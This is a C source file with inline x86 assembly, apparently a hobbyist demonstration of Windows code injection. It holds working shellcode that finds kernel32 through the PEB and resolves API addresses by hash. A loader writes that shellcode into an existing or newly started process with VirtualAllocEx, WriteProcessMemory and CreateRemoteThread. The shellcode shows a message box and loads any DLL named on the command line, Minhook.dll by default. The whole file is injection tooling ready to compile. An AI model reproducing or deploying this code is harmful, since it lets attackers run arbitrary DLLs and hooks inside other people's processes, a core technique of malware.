// A short code demonstrating code injection method for windows
#include<stdio.h>
#include<stdlib.h>
#include<windows.h>
#include<psapi.h>

#pragma pack(4)
typedef struct {
    // these are application specific
    CHAR  szTitle[32];            // 0
    CHAR  szMsg[32];              // 32
    CHAR  api_MessageBoxA[32];    // 64
    CHAR  szUser32[32];           // 96
    DWORD AMessageBoxAA;          // 128
    
    // these are generic
    CHAR  api_GetProcAddress[32]; // 132
    DWORD AGetProcAddressA;       // 164
    DWORD len_GetProcAddress;     // 168
    CHAR  api_LoadLibrary[32];    // 172
    DWORD ALoadLibraryA;          // 204
    
    DWORD dwKernelBase;           // 208
    DWORD dwExportDirectory;      // 212
	
	CHAR  szMyDll[32];            // 216
	CHAR  api_Sleep[32];          // 248
	DWORD ASleepA;                // 280
	CHAR  szEndSign[32];          // 284
	DWORD Debug;                  // 316
} SHELL_DATA;
#pragma pack()

SHELL_DATA shellData = { 
                    "Yo !",                 // 0
                    "GreeTz From SIGSEGV",  // 32
                    "MessageBoxA",          // 64
                    "User32.dll",           // 96
                    0,                      // 128
                    "GetProcAddress",       // 132 
                    0,                      // 164
                    15,                     // 168
                    "LoadLibraryA",         // 172 
                    0,                      // 204
                    0,                      // 208
                    0,                      // 212
                    "Minhook.dll",          // 216 
                    "Sleep",                // 248
                    0,                      // 280
                    "Yo !",                 // 284
                    0                       // 288
                  };

#define DELTA (0x409020 - 0x4013ee)

void ShellCode (void)
{    
	// this will be my start signature
    asm("pushad;");
	asm("xor eax, eax;");
	asm("xor ebx, ebx;");
	asm("xor ecx, ecx;");
	asm("xor edx, edx;");
	asm("popad;");
    	
	asm("pushad;");
  
    asm("call my_entry_point;");
    
    asm("my_entry_point:;");
    asm("   pop edx;");
	asm("   xor ecx, ecx;");
	asm("   mov ebp, 0xffffffff;");
	asm("   or ecx, edx;");
    asm("   sub ecx, 0x10;"); // there are 16 bytes between pushad (first instruction) and pop edx
	asm("   and ebp, ecx;"); // now ebp contains the address of pushad

    asm("   mov eax, ebp;");
    asm("   mov edx, 0x00007c35;");
    asm("   add eax, edx;");
    asm("   push eax;");
    asm("   pop ebp;");

    asm("   cld;");                    // clear the direction flag for the loop
    asm("   xor edx, edx;");           // zero edx

    asm("   mov edx, fs:[edx+0x30];"); // get a pointer to the PEB
    asm("   mov edx, [edx+0x0C];");    // get PEB->Ldr
    asm("   mov edx, [edx+0x14];");    // get the first module from the InMemoryOrder module list
  
    asm("   cmp edx, 0;"); // if we can't find kernel32.dll, exit gracefully
    asm("   jne next_mod;");
    
    asm("exit_now:;");
    asm("   popad;");
    asm("   mov eax, 0;");
    asm("   leave;");
    asm("   ret;");
    
    asm("next_mod:;");
    asm("   mov esi, [edx+0x28];");    // get pointer to modules name (unicode string)

    asm("   push 24;");                // push down the length we want to check
    asm("   pop ecx;");                // set ecx to this length for the loop, ecx holds the counter for the loop command
    asm("   xor edi, edi;");           // clear edi which will store the hash of the module name

    asm("loop_modname:;");
    asm("   xor eax, eax;");           // clear eax
    asm("   lodsb;");                  // read in the next byte of the name
    asm("   cmp al, 97;");            // some versions of Windows use lower case module names, 97 is ascii for lowercase a
    asm("   jl not_lowercase;");
    asm("   sub al, 0x20;");           // if so normalise to uppercase

    asm("not_lowercase:;");
    asm("   ror edi, 13;");            // rotate right our hash value
    asm("   add edi, eax;");           // add the next byte of the name to the hash
    asm("   loop loop_modname;");      // loop until we have read enough
    asm("   cmp edi, 0x6A4ABC5B;");    // compare the hash with that of KERNEL32.DLL
    asm("   mov ebx, [edx+0x10];");    // get this modules base address, ebx holds the name of the module
    asm("   mov edx, [edx];");         // get the next module
    asm("   jne next_mod;");           // if it doesn't match, process the next module    
    
    asm("   mov [ebp+208], ebx;");
    asm("   add ebx, [ebx+0x3C];"); // Start of PE header


    asm("   mov ebx, [ebx+0x78];"); // RVA of export dir
    asm("   add ebx, [ebp+208];");  // VA of export dir
    asm("   mov [ebp+212] , ebx;");
 
    asm("   lea edx,[ebp+132];");
    asm("   mov ecx,[ebp+168];");



//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
//;     <<<<< GetFunctionAddress >>>>>>                                            ;
//;    Extracts Function Address From Export Directory and returns it in eax       ;
//;    Parameters :  Function name in edx , Length in ecx                          ;
//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    asm("GetFunctionAddress:;");
    asm("   push ebx");
    asm("   push esi");
    asm("   push edi");
 
    asm("   mov esi, [ebp+212]");
    asm("   mov esi, [esi+0x20]"); //RVA of ENT
    asm("   add esi, [ebp+208]");  //VA of ENT
    asm("   xor ebx, ebx");
    asm("   cld");
 
    asm("   looper:");
    asm("       inc ebx");
    asm("       lodsd");
    asm("       add eax , [ebp+208]");   //eax now points to the string of a function

    asm("       push esi");      //preserve it for the outer loop
    asm("       mov esi,eax");
    asm("       mov edi,edx");
    asm("       cld");
    asm("       push ecx");
    asm("       repe cmpsb");
    asm("       pop ecx");
    asm("       pop esi");
    asm("       jne looper");

    asm("   dec ebx");
    asm("   mov eax, [ebp+212]");
    asm("   mov eax, [eax+0x24]");       //RVA of EOT
    asm("   add eax, [ebp+208]");     //VA of EOT
    asm("   mov eax, [ebx*2+eax]");  //eax now holds the ordinal of our function
    asm("   and eax, 0x0000FFFF;");
    asm("   mov ebx, [ebp+212]");
    asm("   mov ebx, [ebx+0x1C]");       //RVA of EAT
    asm("   add ebx, [ebp+208]");     //VA of EAT
    asm("   mov ebx, [eax*4+ebx]");
    asm("   add ebx, [ebp+208]");
    asm("   mov eax, ebx");
 
    asm("   pop edi");
    asm("   pop esi");
    asm("   pop ebx");

//;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    
    // Call getprocaddress on loadlibrary
    asm("   mov [ebp+164], eax;"); // save GetProcAddress address
    asm("   lea edx,[ebp+172];");
    asm("   push edx;");
    asm("   push [ebp+208];"); // remove the 'dword' word asm("push dword [ebp+208];");
    asm("   call eax;");
    asm("   mov [ebp+204] , eax;"); // Save loadlibrary's address here

	// Call getprocaddress on Sleep
    asm("   lea edx,[ebp+248];");
    asm("   push edx;");
    asm("   push [ebp+208];"); // remove the 'dword' word asm("push dword [ebp+208];");
	asm("   mov eax, [ebp+164];");
    asm("   call eax;");
	asm("   mov [ebp+280] , eax;"); // Save Sleep's address here
	
    // Call loadlibrary to load user32.dll
    asm("   lea edx , [ebp+96];");
    asm("   push edx;");
	asm("   mov eax, [ebp+204];");
    asm("   call eax;");
	
    // Call getprocaddress on MessageBox
    asm("   lea edx, [ebp+64];");
    asm("   push edx;");
    asm("   push eax;");
    asm("   mov ebx,[ebp+164];");
    asm("   call ebx;");
    asm("   mov [ebp+128], eax;"); // Save address of MessageBoxA

	// load MinHook dll
	asm("   lea edx , [ebp+216];");
    asm("   push edx;");
	asm("   mov eax, [ebp+204];");
    asm("   call eax;");
    // there's no need to take care of error

    // And finally Call MessageBox
    asm("   push 0;");
    asm("   lea edx,[ebp+0];");
    asm("   push edx;");
    asm("   lea edx,[ebp+32];");
    asm("   push edx;");
    asm("   push 0;");
	asm("   mov eax, [ebp+128];");
    asm("   call eax;");

	// Call infinite sleep so that remote thread won't be unloaded
    // because it will also unload minhook
	asm("   push 0xffffffff;");
	asm("   mov eax, [ebp+280];");
	asm("   call eax;");
	
	asm("popad;"); // end of function
	
	// this will be my end signature
    asm("pushad;");
	asm("xor eax, eax;");
	asm("xor ebx, ebx;");
	asm("xor ecx, ecx;");
	asm("xor edx, edx;");
	asm("popad;");

}

void UpdateDllToInject(CHAR * newDll)
{
    strncpy(shellData.szMyDll, newDll, 32);
}

#define SC_SIGN_LEN 10
#define DT_SIGN_LEN 5
#define JMP_INS_LEN 5

// we assume the shell code is not longer than 3K byte
#define MAX_SHELL_SZ (4096 - 1024) // 1 K for data
#define MAX_DATA_SZ  1024

typedef struct {
    DWORD cdStart;
    DWORD cdEnd;
    DWORD cdSize;
    DWORD dltOffset; // absolute offset, don't need to add cdStart
    
    DWORD dtStart;
    DWORD dtEnd;
    DWORD dtSize;
    DWORD dllOffset; // absolute offset, don't need to add dtStart
} SHELL_INFO;

// this might seem excessive but g++ inserted codes in the beginning of ShellCode function
int VerifyShellCode (UCHAR * shellPtr, UCHAR * dataPtr, SHELL_INFO * shellInfo)
{   
    // These are only true for 32-bit
    // pushad; xor eax,eax; xor ebx,ebx; xor ecx,ecx; xor edx,edx; popad;
    UCHAR scSign[SC_SIGN_LEN] = {0x60,0x31,0xC0,0x31,0xDB,0x31,0xC9,0x31,0xD2,0x61};

    // mov edx, 0x00007c35
	UCHAR jmp[JMP_INS_LEN] = {0xBA,0x35,0x7C,0x00,0x00};
	
	UCHAR dtSign[DT_SIGN_LEN] = "Yo !";
    
    DWORD i, j;
    BOOL foundSign;

    if (shellPtr == NULL || dataPtr == NULL || shellInfo == NULL)
        return -1;
    
    // Prep the Shell Code
    // We need to fix the distance between shell code and data1
    
    // First make sure Shell code is good
    foundSign = FALSE;
    shellInfo->cdStart = 0;
    shellInfo->cdEnd = 0;
    for (i = 0; i < MAX_SHELL_SZ && shellInfo->cdEnd == 0; i++)
	{
		if (foundSign == FALSE)
		{
            j = 0;
            while(j < SC_SIGN_LEN && shellPtr[i+j] == scSign[j])
                j++;
			
			// we found the start signature now find the end signature
			if (j == SC_SIGN_LEN)
			{
				foundSign = TRUE;
				shellInfo->cdStart = i; // record the starting address
				i += SC_SIGN_LEN - 1; // -1 for the i++ at the start of loop
			}
		}
		else
		{
			j = 0;
            while(j < SC_SIGN_LEN && shellPtr[i+j] == scSign[j])
                j++;

			if (j == SC_SIGN_LEN)
			{
				i += SC_SIGN_LEN;
				shellInfo->cdEnd = i;
			}
		}
	}
    
    if (shellInfo->cdEnd == 0)
        return -1;
    
    // if shell code is good, get offset of mov edx, 0x00007c35
    // so we can adjust delta between code and data
   
    shellInfo->dltOffset = 0;
    for (i = shellInfo->cdStart; i < shellInfo->cdEnd && shellInfo->dltOffset == 0; i++)
	{
        j = 0;
        while(j < JMP_INS_LEN && shellPtr[i+j] == jmp[j])
            j++;
        
        // we found the start signature now find the end signature
        if (j == JMP_INS_LEN)
            shellInfo->dltOffset = i;
	}
   
    if (shellInfo->dltOffset == 0)
        return -1;
    
    // code is good, set the size of code
    shellInfo->cdSize = shellInfo->cdEnd - shellInfo->cdStart;
    
    // Now make sure data is good
    foundSign = FALSE;
    shellInfo->dtStart = 0;
    shellInfo->dtEnd = 0;
    for (i = 0; i < MAX_DATA_SZ && shellInfo->dtEnd == 0; i++)
	{
		if (foundSign == FALSE)
		{
            j = 0;
            while(j < DT_SIGN_LEN && dataPtr[i+j] == dtSign[j])
                j++;
			
			// we found DT_SIGN_LEN start signature now find the end signature
			if (j == DT_SIGN_LEN)
			{
				foundSign = TRUE;
				shellInfo->dtStart = i; // record the starting address
				i += DT_SIGN_LEN - 1; // -1 for the i++ at the start of loop
			}
		}
		else
		{
			j = 0;
            while(j < DT_SIGN_LEN && dataPtr[i+j] == dtSign[j])
                j++;

			if (j == DT_SIGN_LEN)
			{
				i += 32; //every string is 32 bytes
				shellInfo->dtEnd = i;
			}
		}
	}
    
    if (shellInfo->dtEnd == 0)
        return -1;
    
    shellInfo->dllOffset = shellInfo->dtStart + 216; // for now it's 216
    shellInfo->dtSize = shellInfo->dtEnd - shellInfo->dtStart;
    
    return 0;
}

void DebugPrint(VOID *, VOID *, SHELL_INFO);

int PrepAndStartShellThread(HANDLE Process)
{
    VOID * targetMem;
    DWORD deltaOffset;
	DWORD numBytesWritten;
    BOOL wpmRet;
    HANDLE cRet;
    DWORD nThreadIdentifier;
    
    SHELL_INFO shellInfo;
    DWORD ret = 0;

    ret = VerifyShellCode((UCHAR *)ShellCode, (UCHAR * )&shellData, &shellInfo);
    
    if (ret != 0)
        return -1;
    
#if 1 // this is for debugging    
    DebugPrint((VOID *) ShellCode,(VOID *) &shellData, shellInfo);
   // return 0; 
#endif // debugging    

	// ask for 4K of bytes
	targetMem = VirtualAllocEx(
                               Process, 
                               NULL, 
                               MAX_SHELL_SZ + MAX_DATA_SZ, 
                               MEM_COMMIT | MEM_RESERVE, 
                               PAGE_EXECUTE_READWRITE
                              );

	if (targetMem == NULL)
		return -1;

    // write Shell code to targetMem
    // as expected g++ inserted a few bytes in front of ShellCode function
    // we need to offset by cdStart
	wpmRet = WriteProcessMemory(
                                Process, 
                                targetMem, 
                                (LPCVOID)ShellCode, 
                                shellInfo.cdSize + shellInfo.cdStart, 
                                &numBytesWritten
                                );
    if (wpmRet == FALSE)
        return -1;

    printf("numBytesWritten %d\n\n", numBytesWritten);
    
    // the delta might be altered by codes injected by g++
    deltaOffset = MAX_SHELL_SZ - shellInfo.cdStart + shellInfo.dtStart;
    // update delta between code and data
    wpmRet = WriteProcessMemory(
                                Process, 
                                &((UCHAR * )targetMem)[shellInfo.dltOffset + 1], 
                                &deltaOffset, 
                                sizeof(DWORD), 
                                &numBytesWritten
                                );
    if (wpmRet == FALSE)
        return -1;
    
    // write data
    // we need to offset by dtStart just in case there's padding
	wpmRet = WriteProcessMemory(
                                Process, 
                                (VOID*)((DWORD)targetMem + MAX_SHELL_SZ), 
                                (LPCVOID)&shellData, 
                                shellInfo.dtSize + shellInfo.dtStart, 
                                &numBytesWritten
                               );
    if (wpmRet == FALSE)
        return -1;

#if 1 // this is for debugging
    UCHAR dbgBuffer[MAX_SHELL_SZ + MAX_DATA_SZ];
    ReadProcessMemory(
                        Process, 
                        targetMem, 
                        (PVOID)dbgBuffer, 
                        MAX_SHELL_SZ + MAX_DATA_SZ, 
                        &numBytesWritten
                       );
    DebugPrint((VOID *) dbgBuffer, (VOID*)((DWORD)dbgBuffer + MAX_SHELL_SZ), shellInfo);
    //return 0;
#endif

    // just in case g++ pads my data, point it straight to shellInfo.cdStart
	cRet = CreateRemoteThread(
                              Process, 
                              NULL, 
                              0, 
                              (LPTHREAD_START_ROUTINE) ((DWORD)targetMem + shellInfo.cdStart), 
                              NULL, // parameter for shell code function
                              0, 
                              &nThreadIdentifier
                             );
    if (cRet == NULL)
        return -1;

    return 0;
}

void DebugPrint(VOID * shellPtr, VOID * dataPtr, SHELL_INFO shellInfo)
{
    DWORD i;
    
    printf("cdSize: %d dltOffset:%d dtSize: %d\n\n", shellInfo.cdSize, shellInfo.dltOffset, shellInfo.dtSize);
    printf("cdStart: ");
    for(i = 0; i < SC_SIGN_LEN; i++)
    {
        printf("%2x ", ((UCHAR *)shellPtr)[shellInfo.cdStart + i]);
    }
    printf("\n\n");
    
    printf("dltOffset: ");
    for(i = 0; i < JMP_INS_LEN; i++)
    {
        printf("%2x ", ((UCHAR *)shellPtr)[shellInfo.dltOffset + i]);
    }
    printf("\n\n");
    
    printf("cdEnd: ");
    for(i = SC_SIGN_LEN; i > 0;i--)
    {
        printf("%2x ", ((UCHAR *)shellPtr)[shellInfo.cdEnd - i]);
    }
    printf("\n\n");

    printf("dtStart:%s\n\n", &((CHAR *)dataPtr)[shellInfo.dtStart + 0]);
 
    printf("dllOffset:%s\n\n", &((CHAR *)dataPtr)[shellInfo.dllOffset + 0]);
  
    printf("cdEnd:%s\n\n", &((CHAR *)dataPtr)[shellInfo.dtEnd - 32]);
}


// =========================================================== //
// | For injecting into a running process                    | //
// =========================================================== //


#define MAX_PROCESSES 1024 

DWORD FindProcess(LPCTSTR lpcszFileName) 
{ 
    LPDWORD lpdwProcessIds; 
    LPTSTR  lpszBaseName; 
    HANDLE  hProcess; 
    DWORD   i, cdwProcesses, dwProcessId = 0; 

    lpdwProcessIds = (LPDWORD)HeapAlloc(GetProcessHeap(), 0, MAX_PROCESSES*sizeof(DWORD)); 
    if (lpdwProcessIds != NULL) 
    { 
        if (EnumProcesses(lpdwProcessIds, MAX_PROCESSES*sizeof(DWORD), &cdwProcesses)) 
        { 
            lpszBaseName = (LPTSTR)HeapAlloc(GetProcessHeap(), 0, MAX_PATH*sizeof(TCHAR)); 
            if (lpszBaseName != NULL) 
            { 
                cdwProcesses /= sizeof(DWORD); 
                for (i = 0; i < cdwProcesses; i++) 
                { 
                    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, lpdwProcessIds[i]); 
                    if (hProcess != NULL) 
                    { 
                        if (GetModuleBaseName(hProcess, NULL, lpszBaseName, MAX_PATH) > 0) 
                        {
                            if (!lstrcmpi(lpszBaseName, lpcszFileName)) 
                            { 
                                dwProcessId = lpdwProcessIds[i]; 
                                CloseHandle(hProcess); 
                                break; 
                            } 
                        } 
                        CloseHandle(hProcess); 
                    } 
                } 
                HeapFree(GetProcessHeap(), 0, (LPVOID)lpszBaseName); 
            } 
        } 
        HeapFree(GetProcessHeap(), 0, (LPVOID)lpdwProcessIds); 
    } 
    return dwProcessId; 
}

void InjectIntoExistingProcess(LPCSTR processName)
{
	DWORD nProcessIdentifier;
	HANDLE Process;
    
    if (nProcessIdentifier = FindProcess((LPCTSTR)processName))
    {
        Process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, nProcessIdentifier);
        if (PrepAndStartShellThread(Process) != 0)
            printf("Error injecting shell code.\n");
    }
    else
        printf("Cannot find process: %s\n", processName);
}

// =========================================================== //
// | For injecting by running a new process                  | //
// =========================================================== //

void InjectIntoNewProcess(LPCSTR processName)
{
	STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInformation;
     
    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(STARTUPINFO);

    if(CreateProcess(
                     processName,
                     NULL,
                     NULL,
                     NULL,
                     FALSE,
                     CREATE_SUSPENDED,
                     NULL,
                     NULL,
                     &startupInfo,
                     &processInformation
                     ) )
    {
		HANDLE Process = processInformation.hProcess;

        if (PrepAndStartShellThread(Process) != 0)
            printf("Error injecting shell code.\n");

        ResumeThread(processInformation.hThread);
    }
    else
    {
        printf("Cannot start process: %s\n", processName);
    }
}

// =========================================================== //
// | For testing the shellcode by injecting into own process | //
// =========================================================== //

void InjectIntoThisProcess()
{
    if (PrepAndStartShellThread(GetCurrentProcess()) != 0)
        printf("Error running shell code.\n");
    
    // let remote thread run for a while for local thread
    // in case it just exits immediately since the main process exits
    printf("Press Enter to continue ...");
    getchar();   
}

// =========================================================== //
// | Main function                                           | //
// =========================================================== //

int main (int argc, char * argv[])
{
    DWORD choice;
    
    if (argc < 2)
    {
        printf("Usage: Inject [1/2/3] [\"process name\"] [\"full path of DLL to inject\"]\n");
        printf("               1 - Run Shell Code directly.\n");
        printf("               2 - Inject Shell Code into existing process.\n");
        printf("               3 - Inject Shell Code into a new process.\n");
        
        return 0;
    }
    
    choice = atoi(argv[1]);
    
    if (choice == 1)
    {
        InjectIntoThisProcess();
        return 0;
    }
    
    if (argc < 3)
    {
        printf("Please input process to inject.\n");
        return 0;
    }
    
    if (argc > 3)
        UpdateDllToInject(argv[3]);
    
    if (choice == 2)
        InjectIntoExistingProcess(argv[2]);
    else if (choice == 3)
        InjectIntoNewProcess(argv[2]);
    else
        printf("Wrong option\n.");


    return 0;
}
